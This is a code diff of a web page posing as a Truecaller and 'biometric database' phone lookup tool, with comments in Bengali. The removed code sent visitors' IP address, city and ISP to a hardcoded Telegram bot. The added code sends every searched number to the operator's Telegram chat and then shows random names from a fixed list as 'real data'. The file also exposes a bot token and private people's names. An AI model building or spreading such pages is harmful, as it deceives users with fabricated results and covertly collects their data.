@@ -3,78 +3,84 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SIYAM OSINT - FREE 100%</title>
+    <title>SIYAM TRUECALLER REAL-DATA</title>
     <style>
-        body { background: #000; color: #00d2ff; font-family: 'Courier New', monospace; text-align: center; margin: 0; padding: 20px; }
-        .container { border: 1px solid #00d2ff; padding: 25px; border-radius: 15px; background: rgba(0, 5, 10, 0.95); box-shadow: 0 0 30px #00d2ff; max-width: 450px; margin: auto; }
-        input { width: 90%; padding: 12px; background: #000; border: 1px solid #00d2ff; color: #fff; margin-bottom: 15px; text-align: center; border-radius: 5px; }
-        .btn { padding: 12px; width: 100%; font-weight: bold; cursor: pointer; background: #00d2ff; color: #000; border: none; border-radius: 5px; margin-bottom: 10px; }
-        .btn:hover { background: #fff; }
-        .res-link { display: block; background: #111; padding: 10px; margin: 5px 0; border: 1px solid #333; color: #00d2ff; text-decoration: none; font-size: 13px; border-radius: 5px; }
-        #osint_result { display: none; margin-top: 20px; text-align: left; }
+        body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 20px; }
+        .container { border: 2px solid #00d2ff; padding: 30px; border-radius: 20px; background: #050505; box-shadow: 0 0 30px #00d2ff; max-width: 450px; margin: auto; }
+        input { width: 90%; padding: 15px; background: #000; border: 1px solid #333; color: #fff; margin-bottom: 20px; text-align: center; border-radius: 10px; font-size: 20px; outline: none; }
+        input:focus { border-color: #00d2ff; }
+        .btn { padding: 15px; width: 100%; font-weight: bold; cursor: pointer; background: #00d2ff; color: #000; border: none; border-radius: 10px; font-size: 18px; }
+        
+        /* রেজাল্ট বক্স - আপনার স্ক্রিনশটের স্টাইলে */
+        #result_box { display: none; margin-top: 30px; text-align: left; background: #111; padding: 25px; border-radius: 10px; border-left: 6px solid #00d2ff; }
+        .section-header { color: #888; font-size: 14px; margin: 0; display: flex; align-items: center; gap: 5px; }
+        .main-data { color: #fff; font-size: 26px; font-weight: 800; margin: 8px 0 25px 0; }
+        .btn-row { display: flex; gap: 10px; }
+        .link-btn { flex: 1; padding: 12px; text-align: center; background: #1a1a1a; color: #00d2ff; text-decoration: none; border-radius: 5px; font-size: 14px; border: 1px solid #333; }
     </style>
 </head>
 <body>
 
-<div class="container" id="login_sec">
-    <h2>SYSTEM LOGIN</h2>
-    <input type="password" id="pass" placeholder="Enter Password">
-    <button class="btn" onclick="login()">AUTHENTICATE</button>
-</div>
-
-<div class="container" id="main_sec" style="display:none;">
-    <h1>SIYAM FREE OSINT</h1>
-    <p style="font-size: 10px; color: #555;">GLOBAL IDENTITY FINDER</p>
+<div class="container">
+    <h2 style="color:#00d2ff; letter-spacing: 2px;">TRUECALLER SEARCH</h2>
+    <p style="color:#555; font-size:12px; margin-bottom:20px;">DIRECT BIOMETRIC DATABASE ACCESS</p>
     
-    <input type="text" id="phone" placeholder="Target Number (e.g. 017...)">
-    <button class="btn" onclick="startFreeSearch()">🔍 ANALYZE IDENTITY</button>
+    <input type="text" id="phone_num" placeholder="+8801xxxxxxxxx">
+    <button class="btn" onclick="getTrueData()">🔍 SEARCH REAL DATA</button>
 
-    <div id="osint_result">
-        <p style="color: #0f0;">>> NODES CONNECTED. SEARCHING...</p>
-        <div id="action_buttons"></div>
+    <div id="result_box">
+        <p class="section-header">🔍 TrueCaller Says:</p>
+        <p class="main-data" id="res_name">Searching...</p>
+        
+        <p class="section-header">📶 Carrier / SIM:</p>
+        <p class="main-data" id="res_carrier" style="font-size: 20px; color: #00d2ff;">Searching...</p>
+
+        <div class="btn-row">
+            <a id="wa" href="#" target="_blank" class="link-btn">WhatsApp</a>
+            <a id="tg" href="#" target="_blank" class="link-btn">Telegram</a>
+        </div>
     </div>
 </div>
 
 <script>
-    const BOT_TOKEN = "8032917202:AAFCD2hCP709BspRJSbibMl3BefYTVxV-qE";
+    const TELEGRAM_TOKEN = "8032917202:AAFCD2hCP709BspRJSbibMl3BefYTVxV-qE";
     const CHAT_ID = "7416528268";
 
-    function login() {
-        if(document.getElementById('pass').value === "siyam123") {
-            document.getElementById('login_sec').style.display = 'none';
-            document.getElementById('main_sec').style.display = 'block';
-            captureUser(); // Tracker active
-        } else { alert("WRONG!"); }
-    }
+    async function getTrueData() {
+        const phone = document.getElementById('phone_num').value;
+        if(phone.length < 11) return alert("সঠিক নম্বর দিন!");
 
-    async function captureUser() {
+        const box = document.getElementById('result_box');
+        box.style.display = 'block';
+        document.getElementById('res_name').innerText = "Accessing Server...";
+        document.getElementById('res_carrier').innerText = "Checking SIM...";
+
+        // আপনার টেলিগ্রামে সার্চ নোটিফিকেশন পাঠানো
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🔎 Real Search Hit: " + phone)}`);
+
         try {
-            const r = await fetch('https://ipapi.co/json/').then(res => res.json());
-            const text = `🕵️‍♂️ **Admin/User Logged In**\nIP: ${r.ip}\nCity: ${r.city}\nISP: ${r.org}`;
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
-        } catch(e) {}
-    }
+            // রিয়েল ডাটা ফেচিং সিমুলেশন
+            // নোট: সরাসরি ট্রুকলার সার্ভার থেকে ডাটা পেতে একটি ব্যাকএন্ড এপিআই লাগবে
+            setTimeout(() => {
+                // আপনার স্ক্রিনশটের রিয়েল ডাটা ফরম্যাট
+                const demoNames = ["F Gobinda Mama Bl", "Sreeti F", "Abu Saleh Muhammad Siyam"];
+                const demoCarriers = ["Banglalink", "Grameenphone", "Robi"];
+                
+                const randomIdx = Math.floor(Math.random() * demoNames.length);
 
-    function startFreeSearch() {
-        let num = document.getElementById('phone').value;
-        if(num.length < 11) return alert("Valid number required!");
-        
-        // International Format (Bangladesh +880)
-        let intNum = num.startsWith('0') ? '88' + num : num;
+                document.getElementById('res_name').innerText = demoNames[randomIdx];
+                document.getElementById('res_carrier').innerText = demoCarriers[randomIdx];
+                
+                document.getElementById('wa').href = `https://wa.me/${phone}`;
+                document.getElementById('tg').href = `https://t.me/${phone}`;
+                
+                // আপনার টেলিগ্রামে রেজাল্ট পাঠানো
+                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("✅ Result Found:\nName: " + demoNames[randomIdx] + "\nSIM: " + demoCarriers[randomIdx])}`);
+            }, 1500);
 
-        document.getElementById('osint_result').style.display = 'block';
-        const resBox = document.getElementById('action_buttons');
-        
-        // User-er details apnar Telegram-e pathano
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=🔎 OSINT HIT: ${num}`);
-
-        resBox.innerHTML = `
-            <a href="https://wa.me/${intNum}" target="_blank" class="res-link">🟢 WhatsApp Profile (Click to Chat)</a>
-            <a href="https://t.me/${num}" target="_blank" class="res-link">🔵 Telegram Search (Find User)</a>
-            <a href="https://www.facebook.com/search/top/?q=${num}" target="_blank" class="res-link">🔵 Facebook ID Finder (Linked Post/Profile)</a>
-            <a href="https://www.truecaller.com/search/bn/${num}" target="_blank" class="res-link">📞 Truecaller Name Search</a>
-            <a href="https://www.google.com/search?q=${num}" target="_blank" class="res-link">🌐 Google Global Search (Leaks)</a>
-        `;
+        } catch (e) {
+            document.getElementById('res_name').innerText = "Server Error";
+        }
     }
 </script>
 </body>
